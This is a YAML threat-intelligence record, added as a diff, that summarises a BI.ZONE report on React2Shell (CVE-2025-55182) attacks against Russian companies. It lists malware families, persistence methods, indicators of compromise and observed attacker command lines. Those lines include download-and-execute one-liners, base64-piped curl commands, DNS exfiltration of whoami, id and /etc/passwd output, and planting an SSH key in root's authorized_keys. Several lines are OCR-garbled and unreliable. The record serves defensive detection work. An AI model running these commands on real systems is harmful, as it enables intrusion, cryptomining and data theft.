@@ -1,0 +1,228 @@
+title: Adversaries exploit CVE202555182 to attack Russian companies
+description: Adversaries exploited CVE202555182 (React2Shell) vulnerability to target
+  Russian insurance, ecommerce, and IT sectors, deploying various malware including
+  XMRig, RustoBot, Kaiji, Sliver implant, CrossC2 Cobalt Strike, Tactical RMM, VShell,
+  and EtherRAT.
+attribution: ''
+malware_families:
+- XMRig
+- RustoBot
+- Kaiji
+- Sliver
+- CrossC2
+- Tactical RMM
+- VShell
+- EtherRAT
+cves:
+- CVE202555182
+ttps:
+  processes:
+  - xmrig
+  command_lines:
+  - /bin/sh -c 'cd /tmp; wget hxxp://176.117.107[.]154/bot; chmod 777 bot; ./bot ||
+    cd /tmp; curl -O hxxp://176.117.107[.]154/bot; chmod 777 bot; ./bot'
+  - /bin/sh -c 'echo Y3VybCAtcyAtLW1heC10aW1lIDUgaHR0cHM6Ly90ci5lYXJuLnRvcC9Mb2cucGhwP2lkPU1JSUtO
+    | base64 -d | sh'
+  - /bin/sh -c 'echo Y3VybCAtZnNTTCBodHRwczovL3RyLmVhcm4udG9wL2FwYWNoZXMuc2ggLW8gL3RtcC9hcGFjaGVzLnNoICYmIGNobW9kICt4IC90bXAvYXBhY2hlcy5zaCAmJiBub2h1cCAvdG1wL2FwYWNoZXMuc2ggPi9kZXYvbnVsbCAyPiYxICY=
+    | base64 -d | sh'
+  - /bin/sh -c 'echo $((41*271))'
+  - /bin/sh -c whoami
+  - curl hxxp://103.135.101[.]15/wocaosinm.sh
+  - /bin/sh -c '$(curl -s hxxp://keep.camdvr[.]org:8000/d5.sh | bash | gzip -n | base64
+    -w0)'
+  - wget -O /tmp/runnv.tar.gz hxxp://128.199.194[.]97:9001/runnv.tar.gz
+  - wget -O - hxxp://128.199.194[.]97:9001/setup2.sh
+  - sbin/modprobe msr allow_writes=on
+  - /bin/sh -c 'echo bHM= | base64 -d | sh'
+  - /bin/sh -c 'echo bnNsb29rdXAgYHdob2FtaWAub2lhMGx3dXQybjY1ZjhvNHN3bWJlc3UwbnJ0aWg5NXkub2FzdGlmeS5jb20=
+    | base64 -d | sh'
+  - /bin/sh -c 'echo bnNsb29rdXAgYGxzYC5vaWEwbHd1dDJuNjVmOG80c3dtYmVzdTBucnRpaDk1eS5vYXN0aWZ5LmNvbQ==
+    | base64 -d | sh'
+  - /bin/sh -c 'echo bnNsb29rdXAgYGxzYC42a3JpbmV3YjQ1OG5ocXFtdWVvdGdhd2lwOXYxanI3Zy5vYXN0aWZ5LmNvbQ==
+    | base64 -d | sh'
+  - /bin/sh -c 'echo bnNsb29rdXAgYGlkYC42a3JpbmV3YjQ1OG5ocXFtdWVvdGdhd2lwOXYxanI3Zy5vYXN0aWZ5LmNvbQ==
+    | base64 -d | sh'
+  - /bin/sh -c 'echo bnNsb29rdXAgYHdob2FtaWAuNmtyaW5ld2I0NThuaHFxbXVlb3RnYXdpcDl2MWpyN2cub2FzdGlmeS5jb20=
+    | base64 -d | sh'
+  - /bin/sh -c 'wget hxxp://216.158.232[.]43:12000/sex.sh && bash sex.sh'
+  - wget http://107.173.89[.]153:60051/slt
+  - /bin/sh -c 'wget hxxp://193.24.123[.]68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh'
+  - curl --connect-tineout 16 htcp://Saddvess/Linux_nips
+  - busybox uget hetp://Saddress/Linux_nips
+  - ./linsx nipsel
+  - Linoc nlpselivget -t 1 hrep://Saddress/Linux alpsel
+  - el --comect-tireout 18 HEcp://Saddress/11nus_aipsel
+  - busybox veet HEcp://Soddress/11nus aipsel
+  - ./Linu_sarchoa
+  - on - Tinux_sarchas7
+  - inic_ara7iuget -t 1 hecp:/Sadaress/Tinus aray
+  - cur] --connect-tineoit 10 hecp://gaddress,Yinv avay
+  - busybox et hetp://Sadvess/Linux_arn7chnod +xi arw
+  - Minis_ara| Irm - Tinox_arss
+  - inie arasiuget -t 1 hep:/Saddress/1inue aras
+  - cur] --connect-tineait 10 hecp://Saddressy/ inve avas
+  - '|busynos et hetp://Saddness/Linux arns;ehnod +xTinwe_arae'
+  - nohup $HOME/runnv/runnv >/dev/null 2>&1 &
+  - ps aux | grep "$PROCESS_KEY" | grep -v grep | awk '{print $2}'
+  - ps aux | grep '[r]unnv | grep '/tmp/runnv/runnv | awk {print $2}'
+  - curl http://128.199.194.97:9001/1ived.sh -o /tmp/runnv/lived.sh
+  - wget -0 /tmp/runnv/lived.sh http://128.199.194.97:9001/lived.sh
+  - chmod 777 /tmp/runnv/lived.sh
+  - curl -fsSL http://128.199.194.97:9001/alive.sh -o "/tmp/runnv/alive.sh"
+  - echo "{EA curl TEMLI: /tmp/user.txtchmod 777 /tmp/runnv/alive.sh
+  - curl http://154.89.152.240//a_x64
+  - wget http://154.89.152.240//a x86
+  - sudo su - -c mkdir /root/.ssh
+  - cat /root/.ssh/authorized_keys |grep -a i34k2SxqsNTqPUNGZYEZLthenrm -rf lovedexitelsesudo
+    su - ~c "echo ssh-ed25519 AAAAC3NZaC11ZDTINTESAAAATHQSZYS0DHArpfk62v8FAQi 34k
+    25xqsNTqPURGZYLZT root@localhost >/root/.ssh/authorized_keys"
+  - rm -rf lovesi
+  powershell: []
+  scripts:
+  - wget hxxp://176.117.107[.]154/bot
+  - curl -s --max-time 5 hxxps://tr.earn[.]top/Log.php?id=MIIKN
+  - curl -fsSL hxxps://tr.earn[.]top/apaches.sh -o /tmp/apaches.sh && chmod +x /tmp/apaches.sh
+    && nohup /tmp/apaches.sh >/dev/null 2>&1 &
+  - wget hxxps://tr.earn[.]top/nginxs
+  - curl https://tr.earn[.]top/config.json
+  - /bin/sh -c 'echo $((41*271))'
+  - whoami
+  - wget http://103.135.101[.]15/wocaosinm.sh
+  - curl hxxp://keep.camdvr[.]org:8000/d5.sh | bash | gzip -n | base64 -w0
+  - wget -O /tmp/runnv.tar.gz hxxp://128.199.194[.]97:9001/runnv.tar.gz
+  - wget -O - hxxp://128.199.194[.]97:9001/setup2.sh
+  - sbin/modprobe msr allow_writes=on
+  - nslookup `whoami`.oia0lwut2n65f8o4swmbesu0nrtih95y.oastify[.]com
+  - nslookup `ls`.oia0lwut2n65f8o4swmbesu0nrtih95y.oastify[.]com
+  - nslookup `id`.6krinewb458nhqqmueotgawip9v1jr7g.oastify[.]com
+  - nslookup `cat /etc/passwd`.6krinewb458nhqqmueotgawip9v1jr7g.oastify[.]com
+  - wget hxxp://216.158.232[.]43:12000/sex.sh && bash sex.sh
+  - wget http://107.173.89[.]153:60051/slt
+  - curl hxxp://193.24.123[.]68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh
+  - 2.sh
+  - a1.sh
+  - a2.sh
+  - a3.sh
+  - ch.sh
+  - love0Bash script
+  registry_keys: []
+  image_loads:
+  - runnv.tar.gz
+  - setup_c3pool_miner.sh
+  - alive.sh
+  - lived.sh
+  - system-update-service.service
+  - rsysloeither
+  - meshagents?id=hrfDDhB@yNf4oBrCH@R$KfVp27XfA78LiX@IZUxoTgs3zCwG$bjdpR@0oa8@BhTf&installflags=0&meshinstall=6
+  - node-v20.10.0-linux-x64
+  - solra
+  - solrc
+  - solrk
+  - solrz
+  network_connections:
+  - /bin/sh -> hxxp://176.117.107[.]154/bot:80
+  - /bin/sh -> hxxp://176.117.107[.]154/bot:80
+  - /bin/sh -> hxxps://tr.earn[.]top/Log.php:443
+  - /bin/sh -> hxxps://tr.earn[.]top/apaches.sh:443
+  - /bin/sh -> hxxps://tr.earn[.]top/nginxs:80
+  - /bin/sh -> hxxps://tr.earn[.]top/config.json:80
+  - /bin/sh -> http://103.135.101[.]15/wocaosinm.sh:80
+  - /bin/sh -> hxxp://keep.camdvr[.]org:8000/d5.sh:80
+  - /bin/sh -> hxxp://216.158.232[.]43:12000/sex.sh:80
+  - /bin/sh -> http://107.173.89[.]153:60051/slt:60051
+  - /bin/sh -> hxxp://193.24.123[.]68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh:3001
+  - solra -> hxxp://45.134.174[.]235:443/
+  - solrc -> hxxp://45.134.174[.]235:443/
+  - solrk -> hxxp://45.134.174[.]235:443/
+  - solrz -> hxxp://45.134.174[.]235:443/
+  - ch.sh -> hxxp://109.238.92[.]111:8000/upload
+  - love0Bash script -> hxxps://sitiolibre[.]com/wp/wp-content/plugins/gassembly/js/love0.love0
+  - curl -> 128.199.194.97:9001
+  - wget -> 128.199.194.97:9001
+  - curl -> 154.89.152.240:80
+  - wget -> 154.89.152.240:80
+  file_activity:
+  - /tmp/apaches.sh
+  - /etc/systemd/system/apaches-main.service
+  - /usr/bin/sshd-agent
+  - /tmp/runnv.tar.gz
+  - /usr/bin/node
+  - 7vfgycfd01.js
+  - /tmp/runnv
+  - /etc/resolv.conf
+  - /tmp/runnv/
+  - $HOME/runnv/runnv
+  - /tmp/runnv/lived.sh
+  - /tmp/runnv/alive.sh
+  - /root/.ssh/authorized_keys
+  persistence:
+  - systemd service /etc/systemd/system/apaches-main.service
+  - Cron task /etc/cron.d/apaches-cron
+  - systemd service rsysloeither
+  - crontab @reboot sleep 30 && /usr/bin/node <jsPath> >/dev/null 2>&1 &
+  - .bashrc (nohup /usr/bin/node <jsPath> >/dev/null 2>&1 &) 2>/dev/null
+  - .profile (/usr/bin/node <jsPath> >/dev/null 2>&1 &) 2>/dev/null
+  - Adding SSH key to authorized_keys
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+  - 176.117.107[.]154
+  - 45.137.201[.]137
+  - 103.135.101[.]15
+  - 128.199.194[.]97
+  - 216.158.232[.]43
+  - 107.173.89[.]153
+  - 193.24.123[.]68
+  - 154.89.152[.]240
+  - 156.67.221[.]96
+  - 91.215.85[.]42
+  - 45.134.174[.]235
+  - 109.238.92[.]111
+  - 128.199.194.97
+  - 154.89.152.240
+  domains:
+  - ilefttotolinkalone.anondns[.]net
+  - rustbot.anondns[.]net
+  - bitcoinbandit.anondns[.]net
+  - cryptoenjoyers.anondns[.]net
+  - dontblockme.anondns[.]net
+  - tr.earn[.]top
+  - keep.camdvr[.]org
+  - 103.135.101[.]15
+  - 128.199.194[.]97
+  - 216.158.232[.]43
+  - 107.173.89[.]153
+  - 193.24.123[.]68
+  - 154.89.152[.]240
+  - 156.67.221[.]96
+  - 91.215.85[.]42
+  - api.ipify[.]org
+  - api.my-ip[.]io
+  - api64.ipify[.]org
+  urls:
+  - hxxp://176.117.107[.]154/bot
+  - hxxps://tr.earn[.]top/Log.php?id=MIIKN
+  - hxxps://tr.earn[.]top/apaches.sh
+  - hxxps://tr.earn[.]top/nginxs
+  - hxxps://tr.earn[.]top/config.json
+  - http://103.135.101[.]15/wocaosinm.sh
+  - hxxp://keep.camdvr[.]org:8000/d5.sh
+  - hxxp://216.158.232[.]43:12000/sex.sh
+  - http://107.173.89[.]153:60051/slt
+  - hxxp://193.24.123[.]68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh
+  - hxxp://45.134.174[.]235:443/
+  - hxxps://sitiolibre[.]com/wp/wp-content/plugins/gassembly/js/love0.love0
+  - hxxp://109.238.92[.]111:8000/upload
+  - hecp:/Sadaress/Tinus aray
+  - hecp://gaddress,Yinv avay
+  - hetp://Sadvess/Linux_arn7chnod +xi arw
+  - http://128.199.194.97:9001/1ived.sh
+  - http://128.199.194.97:9001/alive.sh
+  - http://154.89.152.240//a_x64
+  - http://154.89.152.240//a x86
+authors:
+- BI.ZONE Threat Intelligence
+reference: https://bi.zone/eng/expertise/blog/zloumyshlenniki-ekspluatiruyut-uyazvimost-cve-2025-55182-v-atakakh-na-rossiyskie-kompanii
+date_of_publication: December 01, 2025
+file_creation_date: May 09, 2026
